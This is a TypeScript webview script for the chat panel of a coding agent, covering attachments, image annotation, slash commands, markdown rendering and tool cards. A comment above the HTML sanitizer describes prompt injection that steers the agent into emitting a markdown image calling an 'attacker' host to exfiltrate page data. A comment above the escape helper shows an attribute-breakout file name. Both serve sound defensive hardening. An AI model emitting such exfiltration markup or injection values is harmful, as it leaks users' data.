import { marked } from "marked";
import hljs from "highlight.js/lib/common";

declare function acquireVsCodeApi(): { postMessage(m: unknown): void };

marked.setOptions({ breaks: true, gfm: true });

const vscode = acquireVsCodeApi();
const $ = (id: string) => document.getElementById(id) as HTMLElement;

const log = $("log");
const input = $("input") as HTMLTextAreaElement;
const send = $("send") as HTMLButtonElement;
const stop = $("stop") as HTMLButtonElement;
const newBtn = $("newBtn");
const chatsBtn = $("chatsBtn");
const chatsPanel = $("chats");
const modelBtn = $("modelBtn");
const modelMenu = $("model-menu");
let modelOptionsList: { value: string; label: string; title?: string }[] = [];
let currentModel = "default";
const slashPopup = $("slash");
const branchBtn = $("branchBtn");
const tabs = $("tabs");
const changesBar = $("changes-bar");
const changesBadge = $("changes-badge");
const changesPop = $("changes-pop");
const modeBtn = $("modeBtn");
const modeMenu = $("mode-menu");
const attachBtn = $("attachBtn");
const attachmentsBox = $("attachments");
const ctxPill = $("ctx-pill");
const scrollBtn = $("scrollBtn");
const gitBtn = $("gitBtn");
const autofixBtn = $("autofixBtn");
const ctxBtn = $("ctxBtn");
const ctxMenu = $("ctx-menu");
const superBtn = $("superBtn");
const settingsBtn = $("settingsBtn");
const settingsMenu = $("settings-menu");
const rulesBtn = $("rulesBtn");
const rulesMenu = $("rules-menu");
let modeOptions: any[] = [];
let currentMode = "agent";
let attachments: { path: string; name: string; isImage: boolean; src?: string }[] = [];
let allConversations: any[] = [];
let activeConvId: string | undefined;
const runningChatIds = new Set<string>(); // chats with an active run (parallel)
let chatFilter = "";
let hasMessages = false;
// Running in a browser / Telegram Mini App (vs the VS Code panel)? Set by the
// relay's hub-shim before this bundle loads.
const isRemote = !!(window as any).__AGENT_REMOTE__;
// Tag the body so CSS can adapt the remote web app (e.g. hide the 🛰 toggle,
// which would otherwise let a phone kill its own session).
if (isRemote) document.body.classList.add("remote");

function renderAttachments() {
  attachmentsBox.innerHTML = "";
  if (!attachments.length) {
    attachmentsBox.classList.add("hidden");
    return;
  }
  attachmentsBox.classList.remove("hidden");
  attachments.forEach((a, i) => {
    const chip = document.createElement("div");
    chip.className = "attach-chip";
    const drawable = a.isImage && !!a.src;
    // Show a real thumbnail for images, otherwise the file icon.
    const lead =
      drawable
        ? `<img class="attach-thumb" src="${esc(a.src || "")}" alt="${esc(a.name)}" /><span class="attach-edit">✏</span>`
        : `<span class="attach-ico">${a.isImage ? "🖼" : "📄"}</span>`;
    chip.innerHTML = `${lead}<span class="attach-name">${esc(a.name)}</span>`;
    chip.title = drawable ? "Tap to draw / annotate" : a.path;
    if (drawable) {
      chip.classList.add("drawable");
      // Tap the thumbnail (not the ✕) → open the annotator.
      chip.addEventListener("click", (e) => {
        if ((e.target as HTMLElement).classList.contains("attach-x")) return;
        openAnnotator(i);
      });
    }
    const x = document.createElement("button");
    x.className = "attach-x";
    x.textContent = "✕";
    x.addEventListener("click", (e) => {
      e.stopPropagation();
      attachments.splice(i, 1);
      renderAttachments();
    });
    chip.appendChild(x);
    attachmentsBox.appendChild(chip);
  });
}

// ---- image annotator: expand an attached photo, draw on it, send marked-up ----
let annotatorEl: HTMLElement | null = null;
function openAnnotator(index: number) {
  const a = attachments[index];
  if (!a || !a.isImage || !a.src || annotatorEl) return;
  const img = new Image();
  img.onload = () => buildAnnotator(index, a, img);
  img.src = a.src;
}

function buildAnnotator(
  index: number,
  a: { name: string; src?: string },
  img: HTMLImageElement
) {
  const COLORS = ["#ff3b30", "#ffcc00", "#34c759", "#0a84ff", "#ffffff", "#000000"];
  let color = COLORS[0];
  let size = Math.max(3, Math.round(Math.max(img.naturalWidth, img.naturalHeight) / 250));
  type Stroke = { color: string; size: number; pts: { x: number; y: number }[] };
  const strokes: Stroke[] = [];

  const overlay = document.createElement("div");
  overlay.className = "annotator-overlay";
  annotatorEl = overlay;

  const stage = document.createElement("div");
  stage.className = "annotator-stage";
  const canvas = document.createElement("canvas");
  canvas.width = img.naturalWidth;
  canvas.height = img.naturalHeight;
  canvas.className = "annotator-canvas";
  stage.appendChild(canvas);

  const bar = document.createElement("div");
  bar.className = "annotator-bar";
  const swatches = COLORS.map((c) => {
    const b = document.createElement("button");
    b.className = "annot-swatch";
    b.style.background = c;
    if (c === color) b.classList.add("sel");
    b.addEventListener("click", () => {
      color = c;
      bar.querySelectorAll(".annot-swatch").forEach((s) => s.classList.remove("sel"));
      b.classList.add("sel");
    });
    return b;
  });
  const mkBtn = (label: string, cls: string, fn: () => void) => {
    const b = document.createElement("button");
    b.className = "annot-btn " + cls;
    b.textContent = label;
    b.addEventListener("click", fn);
    return b;
  };
  const undoBtn = mkBtn("↶", "", () => {
    strokes.pop();
    redraw();
  });
  const clearBtn = mkBtn("Clear", "", () => {
    strokes.length = 0;
    redraw();
  });
  const cancelBtn = mkBtn("Cancel", "secondary", closeAnnotator);
  const doneBtn = mkBtn("Send ✓", "primary", () => {
    let dataUrl: string;
    try {
      dataUrl = canvas.toDataURL("image/png");
    } catch {
      closeAnnotator();
      return;
    }
    // Replace the original attachment with the annotated version.
    attachments.splice(index, 1);
    renderAttachments();
    const base = (a.name || "image").replace(/\.[^.]+$/, "");
    vscode.postMessage(
      isRemote
        ? { type: "uploadAttachment", name: base + "-annotated.png", dataUrl }
        : { type: "pasteImage", dataUrl }
    );
    closeAnnotator();
  });
  swatches.forEach((s) => bar.appendChild(s));
  bar.append(undoBtn, clearBtn, cancelBtn, doneBtn);

  overlay.append(stage, bar);
  document.body.appendChild(overlay);

  const ctx = canvas.getContext("2d")!;
  function redraw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.drawImage(img, 0, 0);
    ctx.lineJoin = "round";
    ctx.lineCap = "round";
    for (const st of strokes) {
      ctx.strokeStyle = st.color;
      ctx.lineWidth = st.size;
      ctx.beginPath();
      st.pts.forEach((p, i) => (i ? ctx.lineTo(p.x, p.y) : ctx.moveTo(p.x, p.y)));
      ctx.stroke();
    }
  }
  redraw();

  // Map a pointer event to canvas (full-res) coordinates.
  const toXY = (e: PointerEvent) => {
    const r = canvas.getBoundingClientRect();
    return {
      x: ((e.clientX - r.left) / r.width) * canvas.width,
      y: ((e.clientY - r.top) / r.height) * canvas.height,
    };
  };
  let drawing = false;
  let cur: Stroke | null = null;
  canvas.addEventListener("pointerdown", (e) => {
    drawing = true;
    cur = { color, size, pts: [toXY(e)] };
    strokes.push(cur);
    canvas.setPointerCapture(e.pointerId);
    redraw();
  });
  canvas.addEventListener("pointermove", (e) => {
    if (!drawing || !cur) return;
    e.preventDefault();
    cur.pts.push(toXY(e));
    redraw();
  });
  const end = () => {
    drawing = false;
    cur = null;
  };
  canvas.addEventListener("pointerup", end);
  canvas.addEventListener("pointercancel", end);
}

function closeAnnotator() {
  annotatorEl?.remove();
  annotatorEl = null;
}

// Remote (browser / Telegram Mini App): the host can't open a file dialog on the
// user's phone, so pick locally and upload the bytes. In the VS Code panel keep
// the native dialog (lets you attach any workspace file by path).
function uploadLocalFile(file: File) {
  const reader = new FileReader();
  reader.onload = () =>
    vscode.postMessage({ type: "uploadAttachment", name: file.name, dataUrl: reader.result });
  reader.readAsDataURL(file);
}

function openLocalFilePicker() {
  const inp = document.createElement("input");
  inp.type = "file";
  inp.multiple = true;
  // No accept filter → iOS offers Photo Library / Take Photo / Choose File, so
  // screenshots AND documents both work.
  inp.style.display = "none";
  inp.addEventListener("change", () => {
    for (const f of Array.from(inp.files || [])) uploadLocalFile(f);
    inp.remove();
  });
  document.body.appendChild(inp);
  inp.click();
}

attachBtn.addEventListener("click", () => {
  if (isRemote) openLocalFilePicker();
  else vscode.postMessage({ type: "attachFile" });
});

// Ctrl+V image paste
input.addEventListener("paste", (e: ClipboardEvent) => {
  const items = e.clipboardData?.items;
  if (!items) return;
  for (const it of items) {
    if (it.type.startsWith("image/")) {
      const blob = it.getAsFile();
      if (!blob) continue;
      e.preventDefault();
      const reader = new FileReader();
      // Remote pastes go through the upload path too, so the chip (with a
      // browser-loadable data-URL thumbnail) echoes back to the web client.
      reader.onload = () =>
        vscode.postMessage(
          isRemote
            ? { type: "uploadAttachment", name: "pasted.png", dataUrl: reader.result }
            : { type: "pasteImage", dataUrl: reader.result }
        );
      reader.readAsDataURL(blob);
    }
  }
});

// Only commands that actually work: clear/new are handled client-side; the rest
// come live from the SDK's init `slash_commands` for this session.
let slashList: string[] = ["clear", "new"];
const SLASH_DESC: Record<string, string> = {
  clear: "Start a fresh chat (clears context)",
  new: "Start a fresh chat",
  compact: "Compress the conversation to free up context",
  context: "Show how much context is used",
  usage: "Show usage",
  "usage-credits": "Show usage credits",
  "extra-usage": "Show extra usage",
  init: "Generate a CLAUDE.md for this project",
  review: "Review a pull request",
  "code-review": "Review the current diff for bugs",
  "security-review": "Security review of pending changes",
  simplify: "Clean up / simplify the changed code",
  verify: "Verify a change works by running it",
  "deep-research": "Deep multi-source research report",
  run: "Launch and drive the app to test a change",
  loop: "Run a prompt on a recurring interval",
  schedule: "Schedule a recurring cloud agent",
  goal: "Set a goal for the session",
  "update-config": "Configure settings.json",
  debug: "Debug an issue",
  insights: "Show insights",
  "fewer-permission-prompts": "Reduce permission prompts",
};
let runModel = "";
const modelLabels: Record<string, string> = {};
// Display name of the assistant (configurable: agentIde.assistantName).
let assistantName = "Kari";
// Avatar image (media/avatar.png) — used instead of the name/logo when present.
const AVATAR = document.body.dataset.avatar || "";
let avatarOk = !!AVATAR; // flips false if the image 404s → text fallback

// Swap the header logo text for the avatar (falls back to text on error).
(() => {
  const barTitle = document.querySelector(".bar-title") as HTMLElement | null;
  if (!barTitle || !AVATAR) return;
  const txt = barTitle.textContent || "";
  const img = document.createElement("img");
  img.className = "bar-avatar";
  img.src = AVATAR;
  img.alt = txt;
  img.title = txt;
  img.addEventListener("error", () => {
    avatarOk = false;
    barTitle.textContent = txt;
  });
  barTitle.textContent = "";
  barTitle.appendChild(img);
})();

// Model output is untrusted: a web page the agent reads can steer it into
// writing `![x](https://attacker/?d=<page data>)` and the panel would fetch it
// (zero-click exfiltration), or into emitting frames, forms and handlers. The
// HTML from markdown is therefore filtered through an inert parse: nothing
// loads or runs while it is inspected, remote images become plain text, and
// only inert formatting survives.
const BLOCKED_TAGS = new Set([
  "script", "style", "link", "meta", "iframe", "frame", "frameset", "object", "embed", "form", "base",
  "svg", "math", "audio", "video", "source", "track", "canvas", "noscript", "template", "button",
  "textarea", "select", "option", "picture", "portal", "dialog",
]);
const DROP_ATTRS = new Set(["style", "srcset", "ping", "formaction", "srcdoc", "action", "background", "poster"]);
function sanitizeHtml(html: string): string {
  const doc = new DOMParser().parseFromString(html, "text/html");
  const walk = (parent: Element) => {
    for (const el of Array.from(parent.children)) {
      const tag = el.tagName.toLowerCase();
      if (tag === "img") {
        const alt = el.getAttribute("alt") || "image";
        el.replaceWith(doc.createTextNode(`[${alt}: image not loaded]`));
        continue;
      }
      if (tag === "input") {
        // GFM task-list checkboxes are the only input worth keeping — disabled, inert.
        if ((el.getAttribute("type") || "").toLowerCase() === "checkbox") {
          for (const a of Array.from(el.attributes)) if (!["type", "checked"].includes(a.name.toLowerCase())) el.removeAttribute(a.name);
          el.setAttribute("disabled", "");
        } else el.remove();
        continue;
      }
      if (BLOCKED_TAGS.has(tag)) {
        el.remove();
        continue;
      }
      for (const a of Array.from(el.attributes)) {
        const n = a.name.toLowerCase();
        if (n.startsWith("on") || DROP_ATTRS.has(n)) el.removeAttribute(a.name);
      }
      if (tag === "a") {
        const href = el.getAttribute("href") || "";
        if (!/^(https?:|mailto:|#)/i.test(href.trim())) el.removeAttribute("href");
        el.setAttribute("rel", "noopener noreferrer");
        el.removeAttribute("target");
      }
      walk(el);
    }
  };
  walk(doc.body);
  return doc.body.innerHTML;
}

function md(src: string): string {
  return sanitizeHtml(marked.parse(src || "") as string);
}
// Quotes too: esc() output lands inside attributes (alt="", data-path="", title="")
// with file names and paths that can contain `"` — e.g. a repo file named
// `a" onmouseover="…` would otherwise break out of the attribute.
function esc(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!));
}

// Crisp monochrome SVG icons — replace emoji so tools read as "technological"
// and inherit the surrounding text color via currentColor. One 24-viewBox set.
const SVG = (inner: string, fill = false) =>
  `<svg viewBox="0 0 24 24" ${
    fill
      ? 'fill="currentColor" stroke="none"'
      : 'fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"'
  }>${inner}</svg>`;
const ICON: Record<string, string> = {
  term: SVG(`<polyline points="5 7 10 12 5 17"/><line x1="13" y1="17" x2="19" y2="17"/>`),
  read: SVG(
    `<path d="M13 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V9z"/><polyline points="13 3 13 9 19 9"/>`
  ),
  edit: SVG(`<path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4z"/>`),
  search: SVG(`<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.7" y2="16.7"/>`),
  web: SVG(`<circle cx="12" cy="12" r="9"/><path d="M3 12h18"/><path d="M12 3a15 15 0 0 1 0 18 15 15 0 0 1 0-18z"/>`),
  tool: SVG(`<path d="M14.7 6.3a4 4 0 0 0-5.4 5.4L3 18v3h3l6.3-6.3a4 4 0 0 0 5.4-5.4l-2.5 2.5-2-2z"/>`),
  spark: SVG(
    `<path d="M12 2l1.7 5.1a5 5 0 0 0 3.2 3.2L22 12l-5.1 1.7a5 5 0 0 0-3.2 3.2L12 22l-1.7-5.1a5 5 0 0 0-3.2-3.2L2 12l5.1-1.7a5 5 0 0 0 3.2-3.2z"/>`,
    true
  ),
  rules: SVG(
    `<path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/><line x1="9" y1="7" x2="15" y2="7"/><line x1="9" y1="11" x2="13" y2="11"/>`
  ),
  copy: SVG(
    `<rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>`
  ),
  check: SVG(`<polyline points="20 6 9 17 4 12"/>`),
  chevron: SVG(`<polyline points="6 9 12 15 18 9"/>`),
  external: SVG(
    `<path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>`
  ),
  cloud: SVG(`<path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/>`),
};
function ticon(kind: string): string {
  return `<span class="ticon">${ICON[kind] || ICON.tool}</span>`;
}
// Auto-scroll only while the user is parked near the bottom; otherwise leave
// their scroll position alone and surface a "jump to latest" button.
let pinnedToBottom = true;
function atBottom() {
  return log.scrollHeight - log.scrollTop - log.clientHeight < 60;
}
function scroll() {
  // Drop the welcome splash as soon as real content arrives.
  const first = log.firstElementChild;
  if (first && first.classList.contains("welcome") && log.children.length > 1) {
    first.remove();
  }
  // Keep the "thinking" indicator pinned to the very bottom, below the thinking
  // block / tools / streamed text that get appended after it.
  if (workingEl && log.lastElementChild !== workingEl) {
    log.appendChild(workingEl);
  }
  if (pinnedToBottom) log.scrollTop = log.scrollHeight;
}
log.addEventListener("scroll", () => {
  if (restoring) return; // ignore programmatic scrolls during batch restore
  pinnedToBottom = atBottom();
  scrollBtn.classList.toggle("hidden", pinnedToBottom);
});
scrollBtn.addEventListener("click", () => {
  pinnedToBottom = true;
  log.scrollTop = log.scrollHeight;
  scrollBtn.classList.add("hidden");
});
let userCount = 0;
function clearLog() {
  log.innerHTML = "";
  assistantRaw = "";
  assistantEl = null;
  workingEl = null;
  endThinking();
  toolCards.clear();
  userCount = 0;
}

// Open a chat instantly by rendering only the most recent messages; older ones
// load on demand via an "Earlier messages" button. This is what makes switching
// into a huge chat instant instead of re-rendering the whole history each time.
// Rendering is batched across frames (no main-thread freeze) and hidden until
// done (no visible scroll-through), then it lands at the bottom.
const HISTORY_TAIL = 40;
let restoreToken = 0;
let restoring = false;
let fullHistory: any[] = [];

function renderBatched(
  list: any[],
  opts: { draft?: string; earlier?: number; landing?: "bottom" | "top" }
) {
  const token = ++restoreToken;
  restoring = true; // freeze the pinned-to-bottom flag while we backfill
  log.classList.add("loading-history"); // hide build-up; reveal at the end
  if (opts.earlier && opts.earlier > 0) addEarlierButton(opts.earlier);
  let i = 0;
  const BATCH = 12;
  const finish = () => {
    restoring = false;
    endThinking();
    if (!log.children.length) renderWelcome();
    if (opts.draft) {
      input.value = opts.draft;
      input.focus();
    }
    autosize();
    if (opts.landing === "top") {
      pinnedToBottom = false;
      log.scrollTop = 0;
    } else {
      pinnedToBottom = true;
      log.scrollTop = log.scrollHeight;
      scrollBtn.classList.add("hidden");
    }
    log.classList.remove("loading-history");
  };
  if (!list.length) {
    finish();
    return;
  }
  const step = () => {
    if (token !== restoreToken) return; // superseded by a newer load
    const end = Math.min(i + BATCH, list.length);
    for (; i < end; i++) renderStored(list[i]);
    if (i < list.length) requestAnimationFrame(step);
    else finish();
  };
  step();
}

function addEarlierButton(n: number) {
  const b = document.createElement("button");
  b.className = "earlier-btn";
  b.textContent = `↑ Earlier messages (${n})`;
  b.addEventListener("click", () => {
    clearLog();
    renderBatched(fullHistory, { landing: "top" }); // load everything, read from top
  });
  log.appendChild(b);
}

function loadStored(msgs: any[], draft?: string) {
  const list = msgs || [];
  fullHistory = list;
  if (list.length > HISTORY_TAIL) {
    renderBatched(list.slice(-HISTORY_TAIL), {
      draft,
      earlier: list.length - HISTORY_TAIL,
      landing: "bottom",
    });
  } else {
    renderBatched(list, { draft, landing: "bottom" });
  }
}

// ---- assistant streaming bubble ----
let assistantRaw = "";
let assistantEl: HTMLElement | null = null;

function assistantCard(modelLabel?: string): HTMLElement {
  const card = document.createElement("div");
  card.className = "msg assistant";
  const head = document.createElement("div");
  head.className = "msg-head";
  // Avatar-only when we have one (no name text); spark + name as fallback.
  const roleHtml =
    AVATAR && avatarOk
      ? `<span class="role" title="${esc(assistantName)}"><img class="role-avatar" src="${AVATAR}" alt="${esc(assistantName)}" /></span>`
      : `<span class="role"><span class="role-mark">${ICON.spark}</span>${esc(assistantName)}</span>`;
  head.innerHTML =
    roleHtml + (modelLabel ? `<span class="model-pill">${esc(modelLabel)}</span>` : "");
  const av = head.querySelector(".role-avatar") as HTMLImageElement | null;
  if (av)
    av.addEventListener("error", () => {
      avatarOk = false;
      const role = head.querySelector(".role") as HTMLElement;
      if (role)
        role.innerHTML = `<span class="role-mark">${ICON.spark}</span>${esc(assistantName)}`;
    });
  const body = document.createElement("div");
  body.className = "msg-body";
  card.appendChild(head);
  card.appendChild(body);

  // Hover actions: copy this answer, retry the last turn.
  const actions = document.createElement("div");
  actions.className = "msg-actions";
  const copy = document.createElement("button");
  copy.className = "msg-act";
  copy.textContent = "⧉ Copy";
  copy.title = "Copy answer";
  copy.addEventListener("click", () => {
    navigator.clipboard?.writeText(body.innerText || "");
    copy.textContent = "✓ Copied";
    setTimeout(() => (copy.textContent = "⧉ Copy"), 1200);
  });
  const retry = document.createElement("button");
  retry.className = "msg-act";
  retry.textContent = "↻ Retry";
  retry.title = "Re-run the last message";
  retry.addEventListener("click", () => vscode.postMessage({ type: "regenerate" }));
  actions.appendChild(copy);
  actions.appendChild(retry);
  card.appendChild(actions);

  log.appendChild(card);
  return body;
}

function assistantText(t: string) {
  if (!assistantEl) {
    assistantEl = assistantCard(modelLabels[runModel] || runModel);
    assistantRaw = "";
  }
  assistantRaw += t;
  assistantEl.innerHTML = md(assistantRaw);
  enhanceCode(assistantEl);
  linkifyPaths(assistantEl);
  scroll();
}
function endAssistant() {
  assistantEl = null;
  assistantRaw = "";
}

function enhanceCode(scope: HTMLElement) {
  // Inline `code` spans get the same syntax highlighting as block code, so they
  // read as real code instead of a flat grey chip.
  scope.querySelectorAll(":not(pre) > code").forEach((code) => {
    const el = code as HTMLElement;
    if (el.dataset.highlighted) return;
    try {
      hljs.highlightElement(el);
    } catch {
      /* ignore */
    }
  });

  scope.querySelectorAll("pre > code").forEach((code) => {
    const el = code as HTMLElement;
    if (!el.dataset.highlighted) {
      try {
        hljs.highlightElement(el);
      } catch {
        /* ignore */
      }
    }
    const pre = code.parentElement as HTMLElement;
    if (pre.querySelector(".copy")) return;
    // Language tag (top-left) from the markdown fence's language-xxx class.
    const langClass = Array.from(el.classList).find((c) => c.startsWith("language-"));
    const lang = langClass ? langClass.slice("language-".length) : "";
    if (lang) {
      const tag = document.createElement("span");
      tag.className = "code-lang";
      tag.textContent = lang;
      pre.appendChild(tag);
    }
    const btn = document.createElement("button");
    btn.className = "copy";
    btn.textContent = "Copy";
    btn.addEventListener("click", () => {
      navigator.clipboard?.writeText(code.textContent || "");
      btn.textContent = "Copied";
      setTimeout(() => (btn.textContent = "Copy"), 1200);
    });
    pre.appendChild(btn);
  });
}

// ---- simple blocks ----
function addUser(text: string, images: string[] = []) {
  const idx = userCount++;
  const wrap = document.createElement("div");
  wrap.className = "user-wrap";
  const tools = document.createElement("div");
  tools.className = "user-tools";
  const cp = document.createElement("button");
  cp.className = "rewind-btn";
  cp.title = "Copy message";
  cp.textContent = "⧉";
  cp.addEventListener("click", () => navigator.clipboard?.writeText(text));
  const rb = document.createElement("button");
  rb.className = "rewind-btn";
  rb.title = "Edit from here (roll back & reformulate)";
  rb.textContent = "↩";
  rb.addEventListener("click", () => vscode.postMessage({ type: "rewind", userIndex: idx }));
  tools.appendChild(cp);
  tools.appendChild(rb);
  const d = document.createElement("div");
  d.className = "msg user";
  // Inline image previews (pasted / attached) shown in their own framed box.
  if (images.length) {
    const gallery = document.createElement("div");
    gallery.className = "msg-images";
    images.forEach((src) => {
      const img = document.createElement("img");
      img.className = "msg-img";
      img.src = src;
      img.addEventListener("click", () => window.open(src, "_blank"));
      gallery.appendChild(img);
    });
    d.appendChild(gallery);
  }
  if (text) {
    const txt = document.createElement("div");
    txt.className = "msg-text";
    txt.textContent = text;
    d.appendChild(txt);
  }
  wrap.appendChild(tools);
  wrap.appendChild(d);
  log.appendChild(wrap);
  scroll();
}
function addStatus(text: string, cls = ""): HTMLElement {
  const d = document.createElement("div");
  d.className = "status " + cls;
  d.textContent = text;
  log.appendChild(d);
  scroll();
  return d;
}

// The live "thinking" indicator — removed once the turn ends (result/idle/error).
let workingEl: HTMLElement | null = null;
function clearWorking() {
  if (workingEl) {
    workingEl.remove();
    workingEl = null;
  }
}
function addTyping(): HTMLElement {
  const d = document.createElement("div");
  d.className = "typing";
  d.innerHTML =
    `<span class="typing-orb">${ICON.spark}</span>` +
    `<span class="typing-label">thinking</span>` +
    `<span class="dots"><i></i><i></i><i></i></span>`;
  log.appendChild(d);
  scroll();
  return d;
}
// Reflect the live state on the indicator (reasoning vs writing vs tools).
function setTypingLabel(text: string) {
  const l = workingEl?.querySelector(".typing-label");
  if (l) l.textContent = text;
}

// Thinking streams in token-sized deltas; coalesce into one live block that's
// expanded while reasoning (Cursor-style) and collapses to a summary when done.
let thinkingEl: HTMLElement | null = null;
let thinkingDetails: HTMLDetailsElement | null = null;
let thinkingRaw = "";
function addThinking(text: string) {
  if (!text.trim() && !thinkingEl) return;
  if (!thinkingEl) {
    const det = document.createElement("details") as HTMLDetailsElement;
    det.className = "thinking live";
    det.open = true; // show reasoning live while it streams
    det.innerHTML =
      `<summary>${ticon("cloud")}<span class="think-label">Thinking</span>` +
      `<span class="dots"><i></i><i></i><i></i></span></summary>` +
      `<div class="thinking-body"></div>`;
    log.appendChild(det);
    thinkingDetails = det;
    thinkingEl = det.querySelector(".thinking-body") as HTMLElement;
    thinkingRaw = "";
  }
  thinkingRaw += text;
  thinkingEl.innerHTML = md(thinkingRaw);
  scroll();
}
function endThinking() {
  // Collapse the finished reasoning into a tidy summary (like Cursor).
  if (thinkingDetails) {
    thinkingDetails.open = false;
    thinkingDetails.classList.remove("live");
    const lbl = thinkingDetails.querySelector(".think-label");
    if (lbl) lbl.textContent = "Thought";
  }
  thinkingEl = null;
  thinkingDetails = null;
  thinkingRaw = "";
}

// Syntax-highlight every code block inside a scope (tool args, tool output) so
// it isn't a flat grey wall of monospace.
function highlightWithin(scope: HTMLElement) {
  scope.querySelectorAll("pre > code").forEach((code) => {
    const el = code as HTMLElement;
    if (el.dataset.highlighted) return;
    try {
      hljs.highlightElement(el);
    } catch {
      /* ignore */
    }
  });
}

// Turn absolute file paths (C:\…, c:/…, /c/Users/… git-bash, /usr/…) inside a
// rendered scope into clickable links that open the file in the editor.
function normPath(p: string): string {
  const m = /^\/([A-Za-z])\//.exec(p); // git-bash /c/Users → c:/Users
  return m ? p[1] + ":" + p.slice(2) : p;
}
function linkifyPaths(scope: HTMLElement) {
  const nodes: Text[] = [];
  const walker = document.createTreeWalker(scope, NodeFilter.SHOW_TEXT);
  let n: Node | null;
  while ((n = walker.nextNode())) {
    const pe = (n as Text).parentElement;
    if (pe && pe.classList.contains("path-link")) continue;
    nodes.push(n as Text);
  }
  for (const t of nodes) {
    const text = t.nodeValue || "";
    const re = /(?:[A-Za-z]:[\\/]|\/(?:[A-Za-z]\/)?)[\w.\-]+(?:[\\/][\w.\- ]+)*\.\w+/g;
    let m: RegExpExecArray | null;
    let last = 0;
    let frag: DocumentFragment | null = null;
    while ((m = re.exec(text))) {
      frag = frag || document.createDocumentFragment();
      if (m.index > last) frag.appendChild(document.createTextNode(text.slice(last, m.index)));
      const p = m[0];
      const span = document.createElement("span");
      span.className = "path-link";
      span.textContent = p;
      span.title = "Open " + p;
      span.addEventListener("click", () =>
        vscode.postMessage({ type: "openFile", path: normPath(p) })
      );
      frag.appendChild(span);
      last = m.index + p.length;
    }
    if (frag) {
      if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
      t.parentNode?.replaceChild(frag, t);
    }
  }
}

// ---- tool cards (keyed by id) ----
const toolCards = new Map<string, HTMLElement>();
let storedToolSeq = 0; // synthetic ids when rebuilding tool cards on reload

// Strip the mcp__<server>__ prefix so tool names read cleanly.
function shortToolName(name: string): string {
  return name.replace(/^mcp__.+?__/, "");
}
// Terminal-style tools get a real "$ command + output" presentation.
function isTerminalTool(name: string): boolean {
  const n = shortToolName(name);
  return /^(bash|powershell|shell|exec)$/i.test(n) || /^dev_server_/.test(n);
}
function toolMeta(name: string): {
  kind: "term" | "file" | "search" | "generic";
  iconKind: string;
  label: string;
} {
  const n = shortToolName(name);
  if (isTerminalTool(name)) return { kind: "term", iconKind: "term", label: n };
  if (/^(Read|NotebookRead)$/.test(n)) return { kind: "file", iconKind: "read", label: "Read" };
  if (/^(Edit|Write|MultiEdit|NotebookEdit)$/.test(n)) return { kind: "file", iconKind: "edit", label: n };
  if (/^(Grep|Glob)$/.test(n)) return { kind: "search", iconKind: "search", label: n };
  if (/browser_/.test(n)) return { kind: "generic", iconKind: "web", label: n };
  return { kind: "generic", iconKind: "tool", label: n };
}

function addTool(id: string, name: string, inputObj: any) {
  if (name === "TodoWrite" && inputObj?.todos) {
    addTodos(inputObj.todos);
    return;
  }
  const filePath: string | undefined = inputObj?.file_path || inputObj?.path;
  const argStr = inputObj ? JSON.stringify(inputObj, null, 2) : "";
  const cmd: string | undefined =
    typeof inputObj?.command === "string" ? inputObj.command : undefined;
  // Bash/terminal tools carry a human description — use it as the card title
  // (Cursor-style: "Restart panel", not a generic "Terminal").
  const desc: string | undefined =
    typeof inputObj?.description === "string" ? inputObj.description : undefined;
  const meta = toolMeta(name);

  const card = document.createElement("div");
  card.className = "tool-card enter running" + (meta.kind === "term" ? " tool-term" : "");
  // Signature lets a following approval merge its Allow/Deny into THIS card
  // instead of spawning a second card for the same call.
  card.dataset.sig = name + "" + (inputObj ? JSON.stringify(inputObj) : "");
  card.dataset.tool = name;

  const head = document.createElement("div");
  head.className = "tool-head";

  // live status chip: spinner now, ✓/✕ on result
  const status = document.createElement("span");
  status.className = "tool-status running";
  status.innerHTML = `<span class="spin"></span>`;
  head.appendChild(status);

  const nm = document.createElement("span");
  nm.className = "tool-name";
  nm.innerHTML =
    meta.kind === "term"
      ? `${ticon("term")}<span class="tool-label">${esc(desc || "Terminal")}</span>`
      : `${ticon(meta.iconKind)}<span class="tool-label">${esc(meta.label)}</span>`;
  head.appendChild(nm);

  if (filePath) {
    const fileEl = document.createElement("span");
    fileEl.className = "tool-file";
    fileEl.textContent = filePath.split(/[\\/]/).pop() || filePath;
    fileEl.title = filePath + "  (click to open)";
    fileEl.addEventListener("click", () =>
      vscode.postMessage({ type: "openFile", path: filePath })
    );
    head.appendChild(fileEl);
  } else if (meta.kind !== "term") {
    const arg = document.createElement("span");
    arg.className = "tool-arg";
    arg.textContent = argStr.replace(/\s+/g, " ").slice(0, 80);
    head.appendChild(arg);
  }
  card.appendChild(head);

  if (meta.kind === "term") {
    // A real, contained terminal window: titlebar (traffic-lights + shell) →
    // prompt + command → live output pane that fills in when the result lands.
    const shell = /powershell|pwsh/i.test(shortToolName(name))
      ? "powershell"
      : /dev_server/.test(shortToolName(name))
      ? "dev-server"
      : "bash";
    const term = document.createElement("div");
    term.className = "term";

    const bar = document.createElement("div");
    bar.className = "term-bar";
    bar.innerHTML =
      `<span class="term-ico">${ICON.term}</span>` +
      `<span class="term-title">${esc(shell)}</span>`;

    // Functional titlebar controls (no decorative chrome): copy · fold · open.
    const mkAct = (icon: string, title: string): HTMLButtonElement => {
      const b = document.createElement("button");
      b.className = "term-act";
      b.innerHTML = icon;
      b.title = title;
      b.setAttribute("aria-label", title);
      return b;
    };
